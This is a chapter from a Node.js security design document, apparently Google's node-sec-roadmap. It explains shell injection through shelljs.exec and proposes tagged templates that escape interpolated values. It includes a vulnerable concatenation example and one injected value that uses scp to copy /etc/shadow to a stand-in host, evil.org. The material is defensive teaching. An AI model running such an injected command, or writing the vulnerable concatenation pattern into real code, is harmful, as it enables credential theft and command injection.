# Shell injection

Threats: [SHP][]

The [`shelljs` module][shelljs] allows access to the system
shell.  We focus on `shelljs`, but similar arguments apply to builtins
like `child_process.spawn(cmd, { shell: ... })` ([docs][cp.spawn]) and
similar modules.

`shelljs` has some nice programmatic APIs for common shell commands
that escape arguments.

It also provides `shell.exec` which allows full access to the shell
including interpretation of shell meta characters.

Solving [shell injection][SHP] is a much harder problem than query
injection since shell scripts tend to call other shell scripts, so
properly escaping arguments to one script doesn't help if the script
sloppily composes a sub-shell.  The problem of tools that trust their
inputs is not limited to shell scripts: see discussion of image decoders
in [BOF][].

The [shell grammar][] has more layers of interpretation so is arguably
more complex than any one SQL grammar.

We can do much better than string concatenation though.  The code
below is vulnerable.

```js
shelljs.exec("executable '" + x + "'")
```

If an attacker causes

```js
x = " '; scp /etc/shadow evil@evil.org/; echo ' ";
```

then what gets passed to the shell is

```js
executable ' '; scp /etc/shadow evil@evil.org/; echo ' '
```

Instead, consider:

```js
shelljs.exec`executable ${x}`

shelljs.exec`executable '${x}'`
```

This use of tagged templates is roughly equivalent to

```js
shelljs.exec(["executable ", ""], x)

shelljs.exec(["executable \'", "\'"], x)
```

This way, when control reaches `shelljs`, it knows which strings came
from the developer: `["executable ", ""]`, and which are inline
expressions: `x`.  If `shelljs` properly escapes the latter, it
prevents the breach above.

The accompanying example ([code][sh-code]) includes a tag
implementation for `sh` and `bash` that recognizes complex nesting
semantics.

We can't, working within the confines of Node, prevent poorly written
command line tools from breaking when exposed to untrusted inputs, but
we can make sure that we preserve the developer's intent when they
write code that invokes command line tools.  For projects that have
legitimate reasons for invoking sub-shells, consistently using
template tags like this solves some problems and makes it more likely
that effort spent hardening command line tools will yield fruit.

[shell grammar]: http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_10
[shelljs]: https://www.npmjs.com/package/shelljs
[cp.spawn]: https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options
[SHP]: ../chapter-1/threat-SHP.md
[BOF]: ../chapter-1/threat-BOF.md
[sh-code]: https://github.com/google/node-sec-roadmap/tree/master/chapter-7/examples/sh
